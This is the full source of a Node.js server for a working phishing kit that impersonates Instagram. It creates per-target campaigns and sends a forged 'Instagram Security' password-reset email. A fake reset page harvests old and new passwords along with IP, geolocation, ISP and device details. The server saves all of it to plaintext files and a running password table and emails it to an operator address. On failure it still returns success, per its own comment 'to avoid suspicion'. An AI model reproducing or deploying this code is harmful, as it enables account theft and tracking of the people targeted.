require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const cookieParser = require('cookie-parser');
const cors = require('cors');

const app = express();
const PORT = 5678;

// Create captured_data directory on startup
const capturedDataDir = path.join(__dirname, 'captured_data');
if (!fs.existsSync(capturedDataDir)) {
  console.log(`Creating data directory on startup: ${capturedDataDir}`);
  try {
    fs.mkdirSync(capturedDataDir, { recursive: true });
    console.log('Data directory created successfully');
  } catch (err) {
    console.error('Failed to create data directory:', err);
  }
}

// Store active phishing campaigns
const phishingCampaigns = {};

// Middleware
app.use(cors({
  origin: ['http://localhost:5500', 'http://127.0.0.1:5500'],
  methods: ['GET', 'POST'],
  credentials: true
})); // Enable CORS with specific configuration
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Additional CORS handling for preflight requests
app.options('*', cors({
  origin: ['http://localhost:5500', 'http://127.0.0.1:5500'],
  methods: ['GET', 'POST'],
  credentials: true,
  optionsSuccessStatus: 200
}));

// Special CORS handling for the update-password endpoint
app.options('/update-password', cors({
  origin: ['http://localhost:5500', 'http://127.0.0.1:5500'],
  methods: ['POST'],
  credentials: true,
  optionsSuccessStatus: 200
}));

// Setup nodemailer with fallback for missing environment variables
let transporter;
try {
  const emailUser = process.env.EMAIL_USER || '';
  const emailPass = process.env.EMAIL_PASS || '';
  
  if (emailUser && emailPass && emailPass !== 'your_app_password_here') {
    console.log(`Setting up email with user: ${emailUser}`);
    
    // Use a more complete SMTP configuration
    transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true, // use SSL
      auth: {
        user: emailUser,
        pass: emailPass
      },
      tls: {
        // do not fail on invalid certs
        rejectUnauthorized: false
      },
      connectionTimeout: 10000, // 10 seconds
      greetingTimeout: 10000,
      socketTimeout: 15000 // 15 seconds
    });

    // Verify connection configuration
    transporter.verify(function(error, success) {
      if (error) {
        console.log('Email service error:', error);
        console.log('Email configuration failed - check your credentials');
      } else {
        console.log('Email server is ready to send messages');
      }
    });
    
    // Set a reasonable timeout for verification
    setTimeout(() => {
      if (!transporter) {
        console.log('Email verification timed out - falling back to file storage');
      }
    }, 5000);
  } else {
    console.log('Email credentials missing or incomplete - email sending will be disabled');
  }
} catch (error) {
  console.log('Error setting up email transport:', error);
}

// Fallback to file storage if email doesn't work
function setupDataLogging() {
  console.log('Setting up file-based data logging as fallback');
  
  // Create data directory if it doesn't exist
  const dataDir = path.join(__dirname, 'captured_data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
}

// Function to log data to file as fallback
function logDataToFile(data) {
  try {
    // Create data directory if it doesn't exist
    const dataDir = path.join(__dirname, 'captured_data');
    if (!fs.existsSync(dataDir)) {
      console.log(`Creating data directory: ${dataDir}`);
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    // Create unique filename based on timestamp
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const fileName = `capture_${timestamp}.json`;
    const filePath = path.join(dataDir, fileName);
    
    // Limit the captured data to essential fields only
    const limitedData = {
      timestamp: data.timestamp,
      campaignId: data.campaignId,
      targetEmail: data.targetEmail,
      passwords: {
        old: data.passwords?.old || 'Not provided',
        new: data.passwords?.new || 'Not provided'
      },
      ipAddress: data.ipAddress,
      location: data.location && typeof data.location === 'object' ? {
        city: data.location.city,
        country: data.location.country,
        latitude: data.location.latitude,
        longitude: data.location.longitude
      } : data.location,
      provider: data.provider,
      deviceInfo: data.deviceInfo && typeof data.deviceInfo === 'object' ? {
        browser: data.deviceInfo.browser,
        os: data.deviceInfo.os,
        device: data.deviceInfo.device
      } : data.deviceInfo
    };
    
    // Write limited data to file with formatting
    fs.writeFileSync(filePath, JSON.stringify(limitedData, null, 2));
    console.log(`Data successfully logged to file: ${filePath}`);
    
    // Write a simple copy as plaintext for easier reading
    const txtFilePath = path.join(dataDir, `capture_${timestamp}.txt`);
    let plainTextContent = '';
    
    // Format the data as plain text with emphasis on new password in a clean, table-like format
    plainTextContent += `+--------------------------------+\n`;
    plainTextContent += `|    CAPTURED DATA - ${new Date(data.timestamp).toLocaleString()}   |\n`;
    plainTextContent += `+--------------------------------+\n\n`;
    plainTextContent += `Campaign ID: ${data.campaignId || 'Direct Access'}\n`;
    plainTextContent += `Target Email: ${data.targetEmail || 'Unknown'}\n\n`;
    plainTextContent += `OLD PASSWORD: ${data.passwords?.old || 'Not provided'}\n`;
    plainTextContent += `NEW PASSWORD: ${data.passwords?.new || 'Not provided'} ★★★\n\n`;
    plainTextContent += `IP Address: ${data.ipAddress || 'Unknown'}\n`;
    
    // Only include essential location data
    if (data.location) {
      plainTextContent += `Location: `;
      if (typeof data.location === 'object') {
        let locationDetails = [];
        if (data.location.city) locationDetails.push(data.location.city);
        if (data.location.country) locationDetails.push(data.location.country);
        plainTextContent += locationDetails.join(', ') || 'Unknown';
        
        if (data.location.latitude && data.location.longitude) {
          plainTextContent += `\nCoordinates: ${data.location.latitude}, ${data.location.longitude}`;
        }
      } else {
        plainTextContent += 'Unknown';
      }
      plainTextContent += '\n';
    }
    
    plainTextContent += `Provider: ${data.provider || 'Unknown'}\n\n`;
    
    // Only include essential device info
    if (data.deviceInfo) {
      plainTextContent += `Device Info: `;
      if (typeof data.deviceInfo === 'object') {
        let deviceDetails = [];
        if (data.deviceInfo.browser) deviceDetails.push(`Browser: ${data.deviceInfo.browser}`);
        if (data.deviceInfo.os) deviceDetails.push(`OS: ${data.deviceInfo.os}`);
        if (data.deviceInfo.device) deviceDetails.push(`Device: ${data.deviceInfo.device}`);
        plainTextContent += deviceDetails.join(', ') || 'Unknown';
      } else {
        plainTextContent += 'Unknown';
      }
      plainTextContent += '\n';
    }
    
    // Create a separate password summary file for quick reference - in a table format
    const passwordSummaryPath = path.join(dataDir, 'password_captures.txt');
    let passwordSummary = `| ${timestamp} | ${data.targetEmail || 'Unknown'} | ${data.passwords?.new || 'Not provided'} |\n`;
    
    // Append to existing summary or create new file with table headers
    if (fs.existsSync(passwordSummaryPath)) {
      fs.appendFileSync(passwordSummaryPath, passwordSummary);
    } else {
      const tableHeader = 
      `+----------------------+----------------------+----------------------+
| Timestamp            | Email                | New Password         |
+----------------------+----------------------+----------------------+
`;
      fs.writeFileSync(passwordSummaryPath, tableHeader + passwordSummary);
    }
    
    fs.writeFileSync(txtFilePath, plainTextContent);
    console.log(`Plain text data logged to file: ${txtFilePath}`);
    console.log(`Password summary updated at: ${passwordSummaryPath}`);
    
    // If this is from a campaign, update the campaign data with limited info
    if (data.campaignId && phishingCampaigns[data.campaignId]) {
      phishingCampaigns[data.campaignId].status = 'Credentials Captured';
      phishingCampaigns[data.campaignId].capturedData = limitedData;
      phishingCampaigns[data.campaignId].captureTime = new Date().toISOString();
      
      // Save updated campaigns data
      saveCampaignsData();
    }
    
    return true;
  } catch (error) {
    console.error('Error saving data to file:', error);
    
    // Try alternate storage method if primary fails
    try {
      const emergencyPath = path.join(__dirname, `emergency_data_${Date.now()}.json`);
      fs.writeFileSync(emergencyPath, JSON.stringify(data));
      console.log(`Emergency data saved to: ${emergencyPath}`);
    } catch (e) {
      console.error('Even emergency data storage failed:', e);
    }
    
    return false;
  }
}

// Helper function to format object data for plaintext output
function formatObjectForPlaintext(obj, indent = '  ') {
  if (!obj) return 'None';
  
  try {
    let result = '';
    for (const [key, value] of Object.entries(obj)) {
      if (typeof value === 'object' && value !== null) {
        result += `${indent}${key}:\n${formatObjectForPlaintext(value, indent + '  ')}\n`;
      } else {
        result += `${indent}${key}: ${value}\n`;
      }
    }
    return result;
  } catch (e) {
    return String(obj);
  }
}

// Function to save campaigns data to file
function saveCampaignsData() {
  try {
    const dataDir = path.join(__dirname, 'captured_data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    const filePath = path.join(dataDir, 'campaigns.json');
    fs.writeFileSync(filePath, JSON.stringify(phishingCampaigns, null, 2));
    console.log(`Campaigns data saved to: ${filePath}`);
    return true;
  } catch (error) {
    console.error('Error saving campaigns data:', error);
    return false;
  }
}

// Function to load campaigns data from file
function loadCampaignsData() {
  try {
    const filePath = path.join(__dirname, 'captured_data', 'campaigns.json');
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      const parsedData = JSON.parse(data);
      Object.assign(phishingCampaigns, parsedData);
      console.log(`Loaded ${Object.keys(parsedData).length} campaigns from file`);
    }
  } catch (error) {
    console.error('Error loading campaigns data:', error);
  }
}

// Load existing campaigns on startup
loadCampaignsData();

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route for admin dashboard
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API to get all campaigns
app.get('/api/campaigns', (req, res) => {
  res.json(phishingCampaigns);
});

// API to create a new phishing campaign
app.post('/api/campaigns', (req, res) => {
  try {
    const { targetEmail, targetName } = req.body;
    
    if (!targetEmail) {
      return res.status(400).json({ success: false, message: 'Target email is required' });
    }
    
    // Generate a unique campaign ID
    const campaignId = uuidv4();
    // Use the specific URL with port 5500 for better UI, with SERVER URL for data submission
    const resetLink = `http://127.0.0.1:5500/public/index.html?campaign=${campaignId}&server=http://localhost:5678`;
    
    // Create campaign object
    const campaign = {
      id: campaignId,
      targetEmail,
      targetName: targetName || targetEmail.split('@')[0],
      createdAt: new Date().toISOString(),
      status: 'Created',
      resetLink,
      emailSent: false,
      clicked: false,
      capturedData: null
    };
    
    // Save campaign
    phishingCampaigns[campaignId] = campaign;
    saveCampaignsData();
    
    res.status(201).json({ success: true, campaign });
  } catch (error) {
    console.error('Error creating campaign:', error);
    res.status(500).json({ success: false, message: 'Failed to create campaign' });
  }
});

// API to send phishing email
app.post('/api/campaigns/:id/send', (req, res) => {
  try {
    const campaignId = req.params.id;
    const campaign = phishingCampaigns[campaignId];
    
    if (!campaign) {
      return res.status(404).json({ success: false, message: 'Campaign not found' });
    }
    
    // Check if email credentials are properly configured
    const emailUser = process.env.EMAIL_USER || '';
    const emailPass = process.env.EMAIL_PASS || '';
    const isEmailConfigured = emailUser && emailPass && emailPass !== 'your_app_password_here' && transporter;
    
    // If email is not configured, provide link
    if (!isEmailConfigured) {
      console.log('Email credentials not properly configured. Using mock email.');
      
      // Update campaign status without actually sending email
      campaign.emailSent = true;
      campaign.emailSentAt = new Date().toISOString();
      campaign.status = 'Email Sent (Simulated)';
      campaign.emailDetails = {
        mockEmail: true,
        targetEmail: campaign.targetEmail,
        subject: 'Instagram Security: Password Reset Required',
        resetLink: campaign.resetLink
      };
      saveCampaignsData();
      
      return res.json({ 
        success: true, 
        message: 'Email credentials not configured. Click View Details to see the phishing link',
        resetLink: campaign.resetLink,
        campaign: campaign
      });
    }
    
    // Prepare email content
    const resetLink = campaign.resetLink;
    const mailOptions = {
      from: `"Instagram Security" <${emailUser}>`,
      to: campaign.targetEmail,
      subject: 'Instagram Security: Password Reset Required',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #dbdbdb;">
          <div style="text-align: center; margin-bottom: 20px;">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" style="height: 40px;">
          </div>
          
          <div style="margin-bottom: 20px;">
            <h2 style="color: #262626; font-size: 18px; font-weight: 600;">Security Alert</h2>
            <p style="color: #262626; font-size: 14px; line-height: 1.5;">
              Hello ${campaign.targetName},
            </p>
            <p style="color: #262626; font-size: 14px; line-height: 1.5;">
              We detected unusual activity on your Instagram account. For your security, please verify your identity by changing your password.
            </p>
            <p style="color: #262626; font-size: 14px; line-height: 1.5;">
              Please tap the button below to change your password within 24 hours.
            </p>
          </div>
          
          <div style="text-align: center; margin-bottom: 20px;">
            <a href="${resetLink}" style="background-color: #0095f6; color: white; text-decoration: none; padding: 10px 20px; border-radius: 4px; font-weight: 600; font-size: 14px; display: inline-block;">
              Change Password
            </a>
          </div>
          
          <div style="color: #8e8e8e; font-size: 12px; line-height: 1.5; margin-top: 30px; border-top: 1px solid #efefef; padding-top: 20px;">
            <p>If you didn't request a password reset, please ignore this email.</p>
            <p>© Instagram from Meta</p>
          </div>
        </div>
      `
    };
    
    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log('Error sending phishing email:', error);
        return res.status(500).json({ 
          success: false, 
          message: 'Failed to send email: ' + error.message 
        });
      } else {
        console.log('Phishing email sent:', info.response);
        
        // Update campaign status
        campaign.emailSent = true;
        campaign.emailSentAt = new Date().toISOString();
        campaign.status = 'Email Sent';
        saveCampaignsData();
        
        // Add a timeout to prevent hanging if email sending takes too long
        setTimeout(() => {
          // Check if response has already been sent
          if (!res.headersSent) {
            console.log('Email sending timed out');
            
            // Update campaign status to indicate timeout
            campaign.emailSent = false;
            campaign.status = 'Email Send Timeout';
            campaign.lastError = 'Email sending timed out after 10 seconds';
            saveCampaignsData();
            
            return res.status(500).json({ 
              success: false, 
              message: 'Email sending timed out. Please check your email configuration.',
              resetLink: campaign.resetLink,
              campaign: campaign
            });
          }
        }, 10000); // 10 seconds timeout
        
        return res.json({ 
          success: true, 
          message: 'Email sent successfully to ' + campaign.targetEmail, 
          campaign 
        });
      }
    });
  } catch (error) {
    console.error('Error sending phishing email:', error);
    res.status(500).json({ success: false, message: 'Failed to send email' });
  }
});

// Route for handling password reset links
app.get('/reset/:campaignId', (req, res) => {
  const campaignId = req.params.campaignId;
  const campaign = phishingCampaigns[campaignId];
  
  if (campaign) {
    // Update campaign status
    campaign.clicked = true;
    campaign.clickedAt = new Date().toISOString();
    campaign.status = 'Link Clicked';
    campaign.clickIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    campaign.clickUserAgent = req.headers['user-agent'];
    saveCampaignsData();
    
    // Store campaign ID in a cookie for the password page to use
    res.cookie('campaign_id', campaignId, { maxAge: 3600000, httpOnly: true });
    
    // Redirect to password reset page
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    // Handle invalid or expired links
    res.sendFile(path.join(__dirname, 'public', 'error.html'));
  }
});

app.post('/update-password', (req, res) => {
  try {
    console.log('==========================================');
    console.log('FORM SUBMISSION RECEIVED AT:', new Date().toISOString());
    console.log('Request headers:', req.headers);
    console.log('Request body:', req.body);
    console.log('Request campaign ID:', req.body.campaignId);
    
    // Get the passwords from the request body
    const oldPassword = req.body.oldPassword || 'Not provided';
    const newPassword = req.body.newPassword || 'Not provided';
    const confirmPassword = req.body.confirmPassword || 'Not provided';
    
    console.log('Passwords received:');
    console.log('- Old password:', oldPassword);
    console.log('- New password:', newPassword);
    console.log('- Confirm password:', confirmPassword);
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Get user agent info
    const userAgent = req.headers['user-agent'];
    
    // Get campaign ID from the body or from cookie if available
    const campaignId = req.body.campaignId || (req.cookies ? req.cookies.campaign_id : null);
    let targetEmail = null;
    
    console.log('Looking up campaign with ID:', campaignId);
    if (campaignId && phishingCampaigns[campaignId]) {
      console.log('Campaign found in database:', phishingCampaigns[campaignId].id);
      targetEmail = phishingCampaigns[campaignId].targetEmail;
      
      // Update campaign status and store the captured passwords
      phishingCampaigns[campaignId].status = 'Credentials Captured';
      phishingCampaigns[campaignId].credentialCapturedAt = new Date().toISOString();
      phishingCampaigns[campaignId].capturedPasswords = {
        old: oldPassword,
        new: newPassword
      };
      console.log('Updated campaign with password data');
      saveCampaignsData();
    } else {
      console.log('Campaign not found or invalid campaign ID');
    }
    
    // Location data and other info would be sent from frontend
    let location, provider, deviceInfo;
    
    try {
      location = typeof req.body.location === 'string' 
        ? JSON.parse(req.body.location) 
        : req.body.location || {};
    } catch (e) {
      console.log('Failed to parse location:', e.message);
      location = { error: `Failed to parse location: ${e.message}` };
    }
    
    try {
      provider = req.body.provider || 'Unknown';
    } catch (e) {
      console.log('Failed to get provider:', e.message);
      provider = 'Unknown';
    }
    
    try {
      deviceInfo = typeof req.body.deviceInfo === 'string' 
        ? JSON.parse(req.body.deviceInfo) 
        : req.body.deviceInfo || {};
    } catch (e) {
      console.log('Failed to parse device info:', e.message);
      deviceInfo = { error: `Failed to parse device info: ${e.message}` };
    }

    // Prepare all the captured data
    const capturedData = {
      timestamp: new Date().toISOString(),
      campaignId: campaignId,
      targetEmail: targetEmail,
      passwords: {
        old: oldPassword || 'Not provided',
        new: newPassword || 'Not provided',
        confirm: confirmPassword || 'Not provided'
      },
      ipAddress: ip,
      location: location,
      provider: provider,
      userAgent: userAgent,
      deviceInfo: deviceInfo
    };

    // Log to console for debugging
    console.log('Data captured:', JSON.stringify(capturedData, null, 2));

    // Always log the data to a file
    logDataToFile(capturedData);

    // Try to send email only if transporter is configured
    if (transporter) {
      // Prepare email content
      const mailOptions = {
        from: process.env.EMAIL_USER || 'f219632@cfd.nu.edu.pk',
        to: process.env.EMAIL_TO || 'f219632@cfd.nu.edu.pk',
        subject: campaignId ? `Password Captured - Campaign ${campaignId}` : 'New Password Data Captured',
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e3e3e3; border-radius: 5px;">
            <h2 style="color: #333; border-bottom: 1px solid #eee; padding-bottom: 10px;">Captured User Data</h2>
            
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
              ${campaignId ? `
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Campaign ID</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${campaignId}</td>
              </tr>` : ''}
              
              ${targetEmail ? `
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Target Email</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${targetEmail}</td>
              </tr>` : ''}
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Old Password</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${oldPassword}</td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">New Password</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee; background-color: #fff9e6; font-weight: bold;">${newPassword}</td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">IP Address</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${ip}</td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Location</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">
                  ${location && typeof location === 'object' ? 
                    `${location.city || ''} ${location.country || ''} 
                     ${location.latitude && location.longitude ? 
                       `<br>Coordinates: ${location.latitude}, ${location.longitude}` : 
                       ''}`
                    : 'Unknown'}
                </td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Internet Provider</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${provider || 'Unknown'}</td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Device Info</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">
                  ${deviceInfo && typeof deviceInfo === 'object' ? 
                    `${deviceInfo.browser ? `Browser: ${deviceInfo.browser}<br>` : ''}
                     ${deviceInfo.os ? `OS: ${deviceInfo.os}<br>` : ''}
                     ${deviceInfo.device ? `Device: ${deviceInfo.device}` : ''}`
                    : 'Unknown'}
                </td>
              </tr>
              
              <tr>
                <td style="padding: 8px; border-bottom: 1px solid #eee; font-weight: bold; width: 30%;">Timestamp</td>
                <td style="padding: 8px; border-bottom: 1px solid #eee;">${new Date().toLocaleString()}</td>
              </tr>
            </table>
            
            <div style="font-size: 12px; color: #777; margin-top: 30px; border-top: 1px solid #eee; padding-top: 10px;">
              This data has also been saved to your server's captured_data directory.
            </div>
          </div>
        `
      };

      // Send email with proper timeout handling
      try {
        transporter.sendMail(mailOptions, (error, info) => {
          if (error) {
            console.log('Error sending email:', error);
            console.log('Falling back to file storage for captured data');
          } else {
            console.log('Email sent:', info.response);
          }
        });
        
        // Set a timeout to prevent hanging if email sending takes too long
        setTimeout(() => {
          console.log('Email sending timed out, continuing with response');
        }, 5000); // 5 seconds timeout
      } catch (err) {
        console.error('Exception while sending email:', err);
        console.log('Falling back to file storage for captured data');
      }
    }

    // Send a response to the client - don't wait for email to complete
    res.status(200).json({ success: true, message: 'Password update request received' });
  } catch (error) {
    console.error('Error processing form submission:', error);
    // Still send a success response to avoid suspicion
    res.status(200).json({ success: true });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
}); 